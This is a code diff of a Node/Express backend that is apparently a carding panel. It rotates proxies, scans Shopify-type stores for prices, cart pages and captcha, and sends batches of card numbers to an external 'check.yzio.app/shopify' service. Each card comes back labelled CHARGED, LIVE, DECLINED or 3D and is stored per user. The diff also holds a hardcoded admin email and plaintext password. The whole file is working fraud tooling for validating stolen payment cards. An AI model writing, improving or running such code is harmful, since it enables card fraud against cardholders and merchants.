@@ -17,9 +17,7 @@ const db = {
   users: [
     { email: 'yousafcodes.de@gmail.com', pass: 'YOUSAFCODES.DE', role: 'admin', name: 'Oggy Admin', status: 'active' }
   ],
-  sites: [
-    { domain: 'shopify.com', price: '29.00', currency: 'USD' }
-  ],
+  sites: [],
   proxies: [],
   inbox: [],
   activity: [],
@@ -73,166 +71,146 @@ app.post('/api/settings', (req, res) => {
   res.json({ success: true });
 });
 
-// ─── ULTRA FAST PROXY CHECKER ───
-app.get('/api/proxies', (req, res) => res.json(db.proxies));
-
+// ─── PROXY CHECKER (With MS timing) ───
 app.post('/api/check-proxies', async (req, res) => {
   const { proxies } = req.body;
-  if (!proxies || !proxies.length) return res.json({ success: true, live: 0, total: db.proxies.length });
+  if (!proxies || !proxies.length) return res.json({ success: true, live: [] });
 
   const liveProxies = [];
-  const batchSize = 100; // Huge batch size for speed
+  const batchSize = 50; 
   
   for (let i = 0; i < proxies.length; i += batchSize) {
     const batch = proxies.slice(i, i + batchSize);
     const results = await Promise.all(batch.map(async (p) => {
       const formatted = formatProxy(p);
+      const start = Date.now();
       try {
         const agent = new HttpsProxyAgent(formatted);
-        // 3 second timeout for lightning fast checking
-        await axios.get('https://api.ipify.org?format=json', { httpsAgent: agent, timeout: 3000 });
-        return p;
+        await axios.get('https://api.ipify.org?format=json', { httpsAgent: agent, timeout: 5000 });
+        const ms = Date.now() - start;
+        return { proxy: p, ms: ms };
       } catch (err) { return null; }
     }));
     results.forEach(r => { if (r) liveProxies.push(r); });
   }
 
-  db.proxies = [...new Set([...db.proxies, ...liveProxies])];
-  res.json({ success: true, live: liveProxies.length, total: db.proxies.length });
+  // Sort by fastest
+  liveProxies.sort((a, b) => a.ms - b.ms);
+  res.json({ success: true, live: liveProxies });
 });
 
+// ─── SAVE PROXIES/API (No Checking) ───
+app.post('/api/save-proxies', (req, res) => {
+  const { proxies } = req.body;
+  if (!proxies || !proxies.length) return res.json({ success: true, total: db.proxies.length });
+  const clean = proxies.map(p => p.trim()).filter(p => p.length > 3);
+  db.proxies = [...new Set([...db.proxies, ...clean])];
+  res.json({ success: true, total: db.proxies.length });
+});
+
+app.get('/api/proxies', (req, res) => res.json(db.proxies));
 app.delete('/api/proxies', (req, res) => {
   const { proxy } = req.body;
   if (!proxy) return res.status(400).json({ error: 'Proxy required' });
-  const before = db.proxies.length;
   db.proxies = db.proxies.filter(p => p !== proxy);
-  res.json({ success: true, removed: before - db.proxies.length, total: db.proxies.length });
+  res.json({ success: true, total: db.proxies.length });
+});
+
+// ─── SAVE SITES (No Checking) ───
+app.post('/api/save-sites', (req, res) => {
+  const { sites } = req.body;
+  if (!sites || !sites.length) return res.json({ success: true, total: db.sites.length });
+  
+  sites.forEach(s => {
+    let domain = s.trim().replace(/^https?:\/\//, '').replace(/\/+$/, '');
+    if (!domain) return;
+    const existing = db.sites.find(x => x.domain === domain);
+    if (!existing) {
+      db.sites.push({ domain: domain, price: 'N/A', currency: 'USD' });
+    }
+  });
+  res.json({ success: true, total: db.sites.length });
+});
+
+app.get('/api/sites', (req, res) => res.json(db.sites));
+app.delete('/api/sites', (req, res) => {
+  const { domain } = req.body;
+  if (!domain) return res.status(400).json({ error: 'Domain required' });
+  db.sites = db.sites.filter(s => s.domain !== domain);
+  res.json({ success: true, total: db.sites.length });
 });
 
 // ─── ADVANCED SITE CHECKER ───
 app.post('/api/check-sites-advanced', async (req, res) => {
   const { sites, minPrice, maxPrice } = req.body;
-  if (!sites || !sites.length) return res.json({ success: true, cleanSites: [], upperSites: [], totalChecked: 0 });
+  if (!sites || !sites.length) return res.json({ success: true, cleanSites: [], upperSites: [] });
 
-  const cleanSites = []; // Between min and max
-  const upperSites = []; // Higher than max but live
-  const totalChecked = sites.length;
+  const cleanSites = [];
+  const upperSites = [];
   
-  // Process 5 sites at a time to avoid rate limits
-  for (let i = 0; i < sites.length; i += 5) {
-    const batch = sites.slice(i, i + 5);
+  for (let i = 0; i < sites.length; i += 3) { // Smaller batches to prevent timeouts
+    const batch = sites.slice(i, i + 3);
     await Promise.all(batch.map(async (s) => {
       let domain = s.trim().replace(/^https?:\/\//, '').replace(/\/+$/, '');
       if (!domain) return;
       
       let proxyStr = db.proxies.length > 0 ? db.proxies[Math.floor(Math.random() * db.proxies.length)] : null;
       
-      let attempts = 0;
       let isLive = false;
       let minSitePrice = Infinity;
       let maxSitePrice = 0;
-      let currency = 'USD';
       let graphql = false;
       let checkout = false;
       let captcha = false;
 
-      while (attempts < 2 && !isLive) {
-        attempts++;
-        const options = { timeout: 8000, validateStatus: () => true };
-        if (proxyStr) {
-          const formatted = formatProxy(proxyStr);
-          if (formatted) options.httpsAgent = new HttpsProxyAgent(formatted);
-        }
-
-        try {
-          // 1. Check Liveness & Prices (products.json is fastest)
-          const prodRes = await axios.get(`https://${domain}/products.json?limit=250`, options);
-          if (prodRes.status === 200 && prodRes.data && Array.isArray(prodRes.data.products)) {
-            isLive = true;
-            prodRes.data.products.forEach(prod => {
-              if (prod.variants) {
-                prod.variants.forEach(v => {
-                  const p = parseFloat(v.price);
-                  if (!isNaN(p) && p > 0) {
-                    if (p < minSitePrice) minSitePrice = p;
-                    if (p > maxSitePrice) maxSitePrice = p;
-                  }
-                });
-              }
-            });
-            // 2. Check GraphQL
-            try {
-              const gql = await axios.post(`https://${domain}/api/graphql`, { query: '{ shop { name } }' }, options);
-              if (gql.status === 200 && gql.data) graphql = true;
-            } catch(e) {}
-
-            // 3. Check Checkout
-            try {
-              const chk = await axios.get(`https://${domain}/cart`, options);
-              if (chk.status === 200) checkout = true;
-            } catch(e) {}
-
-            // 4. Check Captcha
-            try {
-              const html = await axios.get(`https://${domain}`, options);
-              const body = String(html.data).toLowerCase();
-              if (body.includes('hcaptcha') || body.includes('recaptcha') || body.includes('captcha')) captcha = true;
-            } catch(e) {}
-            
-            break; // Break the retry loop if success
-          }
-        } catch (err) {
-          // Try next proxy on next loop
-          if (db.proxies.length > 0) proxyStr = db.proxies[Math.floor(Math.random() * db.proxies.length)];
-        }
+      const options = { timeout: 8000, validateStatus: () => true };
+      if (proxyStr) {
+        const formatted = formatProxy(proxyStr);
+        if (formatted) options.httpsAgent = new HttpsProxyAgent(formatted);
       }
+
+      try {
+        const prodRes = await axios.get(`https://${domain}/products.json?limit=250`, options);
+        if (prodRes.status === 200 && prodRes.data && Array.isArray(prodRes.data.products)) {
+          isLive = true;
+          prodRes.data.products.forEach(prod => {
+            if (prod.variants) {
+              prod.variants.forEach(v => {
+                const p = parseFloat(v.price);
+                if (!isNaN(p) && p > 0) {
+                  if (p < minSitePrice) minSitePrice = p;
+                  if (p > maxSitePrice) maxSitePrice = p;
+                }
+              });
+            }
+          });
+          
+          try { const gql = await axios.post(`https://${domain}/api/graphql`, { query: '{ shop { name } }' }, options); if (gql.status === 200 && gql.data) graphql = true; } catch(e) {}
+          try { const chk = await axios.get(`https://${domain}/cart`, options); if (chk.status === 200) checkout = true; } catch(e) {}
+          try {
+            const html = await axios.get(`https://${domain}`, options);
+            const body = String(html.data).toLowerCase();
+            if (body.includes('hcaptcha') || body.includes('recaptcha') || body.includes('captcha')) captcha = true;
+          } catch(e) {}
+        }
+      } catch (err) {}
 
       if (isLive) {
         const siteData = { 
           domain, 
           minPrice: minSitePrice === Infinity ? 0 : minSitePrice.toFixed(2), 
           maxPrice: maxSitePrice.toFixed(2), 
-          currency, graphql, checkout, captcha 
+          graphql, checkout, captcha 
         };
-        
         const siteMin = minSitePrice === Infinity ? 0 : minSitePrice;
         
-        if (siteMin >= minPrice && siteMin <= maxPrice) {
-          cleanSites.push(siteData);
-        } else if (siteMin > maxPrice) {
-          upperSites.push(siteData);
-        }
+        if (siteMin >= minPrice && siteMin <= maxPrice) cleanSites.push(siteData);
+        else if (siteMin > maxPrice) upperSites.push(siteData);
       }
     }));
   }
 
-  res.json({ success: true, cleanSites, upperSites, totalChecked });
-});
-
-app.post('/api/save-sites-advanced', (req, res) => {
-  const { sites } = req.body;
-  if (sites && sites.length) {
-    sites.forEach(newSite => {
-      const existing = db.sites.find(s => s.domain === newSite.domain);
-      if (existing) {
-         existing.price = newSite.minPrice;
-         existing.currency = newSite.currency;
-      } else {
-         db.sites.push({ domain: newSite.domain, price: newSite.minPrice, currency: newSite.currency });
-      }
-    });
-  }
-  res.json({ success: true, total: db.sites.length });
-});
-
-app.get('/api/sites', (req, res) => res.json(db.sites));
-
-app.delete('/api/sites', (req, res) => {
-  const { domain } = req.body;
-  if (!domain) return res.status(400).json({ error: 'Domain required' });
-  const before = db.sites.length;
-  db.sites = db.sites.filter(s => s.domain !== domain);
-  res.json({ success: true, removed: before - db.sites.length, total: db.sites.length });
+  res.json({ success: true, cleanSites, upperSites });
 });
 
 // ─── BACKGROUND TASK SYSTEM (CARDS) ───
@@ -244,10 +222,7 @@ app.post('/api/start-task', (req, res) => {
     return res.status(400).json({ error: 'Task already running' });
   }
 
-  db.tasks[email] = {
-    status: 'running', queue: [...cards], results: [], total: cards.length, checked: 0
-  };
-
+  db.tasks[email] = { status: 'running', queue: [...cards], results: [], total: cards.length, checked: 0 };
   processUserTask(email);
   res.json({ success: true });
 });
@@ -270,9 +245,7 @@ async function checkCardWithRetry(cc) {
   let attempts = 0;
   while (attempts < 3) {
     attempts++;
-    let proxyStr = null;
-    let proxyUrl = null;
-
+    let proxyStr = null, proxyUrl = null;
     if (db.proxies.length > 0) {
       const idx = Math.floor(Math.random() * db.proxies.length);
       proxyStr = db.proxies[idx];
@@ -280,10 +253,8 @@ async function checkCardWithRetry(cc) {
     }
 
     const siteObj = db.sites.length > 0 ? db.sites[Math.floor(Math.random() * db.sites.length)] : { domain: 'shopify.com' };
-    const site = siteObj.domain;
-
     const targetUrl = new URL('https://check.yzio.app/shopify');
-    targetUrl.searchParams.append('site', site);
+    targetUrl.searchParams.append('site', siteObj.domain);
     targetUrl.searchParams.append('cc', cc);
     if (db.apiKey && db.apiKey.trim() !== '') targetUrl.searchParams.append('key', db.apiKey.trim());
     if (proxyStr) targetUrl.searchParams.append('proxy', proxyStr);
@@ -328,27 +299,17 @@ async function processUserTask(email) {
       let displayLabel = 'UNKNOWN';
       let uiStatus = 'unknown';
 
-      if (apiResponse.includes('CHARGED') || apiResponse.includes('SUCCESS')) {
-        displayLabel = 'CHARGED'; uiStatus = 'charged';
-      } else if (apiResponse.includes('LIVE') || apiResponse.includes('APPROVED') || apiResponse.includes('INSUFFICIENT') || (isSuccess && apiResponse !== 'CARD_DECLINED')) {
-        displayLabel = 'LIVE'; uiStatus = 'live';
-      } else if (apiResponse.includes('DECLINED') || apiResponse.includes('DEAD') || isSuccess === false) {
-        displayLabel = 'DECLINED'; uiStatus = 'declined';
-      } else if (apiResponse.includes('3DS') || apiResponse.includes('OTP') || apiResponse.includes('AUTHENTICATION')) {
-        displayLabel = '3D'; uiStatus = 'otp';
-      } else if (apiResponse) {
-        displayLabel = apiResponse.substring(0, 12);
-      }
+      if (apiResponse.includes('CHARGED') || apiResponse.includes('SUCCESS')) { displayLabel = 'CHARGED'; uiStatus = 'charged'; }
+      else if (apiResponse.includes('LIVE') || apiResponse.includes('APPROVED') || apiResponse.includes('INSUFFICIENT') || (isSuccess && apiResponse !== 'CARD_DECLINED')) { displayLabel = 'LIVE'; uiStatus = 'live'; }
+      else if (apiResponse.includes('DECLINED') || apiResponse.includes('DEAD') || isSuccess === false) { displayLabel = 'DECLINED'; uiStatus = 'declined'; }
+      else if (apiResponse.includes('3DS') || apiResponse.includes('OTP') || apiResponse.includes('AUTHENTICATION')) { displayLabel = '3D'; uiStatus = 'otp'; }
+      else if (apiResponse) { displayLabel = apiResponse.substring(0, 12); }
 
       let message = apiResponse;
       if (gateway) message = `${gateway} - ${apiResponse}`;
       if (price) message += ` ($${price})`;
 
-      const entry = {
-        id: Date.now() + Math.random(),
-        cc, status: uiStatus, label: displayLabel, message: message || 'No message', rawJSON: data, time: new Date().toISOString()
-      };
-
+      const entry = { id: Date.now() + Math.random(), cc, status: uiStatus, label: displayLabel, message: message || 'No message', rawJSON: data, time: new Date().toISOString() };
       task.results.push(entry);
       
       db.activity.unshift({ user: email, action: 'check', card: cc, result: uiStatus, time: entry.time });
@@ -359,10 +320,7 @@ async function processUserTask(email) {
         if (db.inbox.length > 500) db.inbox.pop();
       }
     } else {
-      task.results.push({
-        id: Date.now() + Math.random(),
-        cc, status: 'unknown', label: 'ERROR', message: result.error || 'Failed', rawJSON: {}, time: new Date().toISOString()
-      });
+      task.results.push({ id: Date.now() + Math.random(), cc, status: 'unknown', label: 'ERROR', message: result.error || 'Failed', rawJSON: {}, time: new Date().toISOString() });
     }
     task.checked++;
   }
@@ -379,7 +337,6 @@ app.get('/api/admin/data', (req, res) => {
     inbox = inbox.filter(i => i.user === email);
     activity = activity.filter(a => a.user === email);
   }
-
   res.json({ inbox, activity });
 });
 
